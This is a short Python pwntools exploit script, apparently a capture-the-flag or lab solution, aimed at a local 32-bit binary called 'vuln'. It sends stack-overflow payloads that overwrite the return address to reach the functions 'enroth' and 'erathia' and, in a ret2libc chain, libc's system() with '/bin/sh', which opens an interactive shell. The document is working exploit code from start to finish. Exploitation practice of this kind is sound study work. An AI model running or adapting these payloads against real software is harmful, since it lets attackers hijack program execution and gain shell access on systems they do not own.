from pwn import *

def exploit_binary(binary, padding, addr, g, params=None, pad=False):
	p = process(binary)
	p.recvline()

	payload = str(g).encode() + padding * b'a' + p32(addr)
	if params:
		if pad:
			payload += b'aaaa'
		payload += b''.join([p32(p) for p in params])
	p.sendline(payload)

	p.interactive()
	p.close()


if __name__ == '__main__':
	elf = ELF('vuln')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
	libc.address = 0xf7dbd000  # from ldd
	bin_sh_addr = next(elf.search(b'/bin/sh\x00'))
	g = 0xc001face

	print('Exploiting enroth...')
	exploit_binary('./vuln', 0x44, elf.symbols['enroth'], g)
	
	print('Exploiting erathia...')
	exploit_binary('./vuln', 0x44, elf.symbols['erathia'] + 8, g,
		[bin_sh_addr])

	print('Exploiting system@libc...')
	exploit_binary('./vuln', 0x44, libc.symbols['system'], g,
		[bin_sh_addr], True)
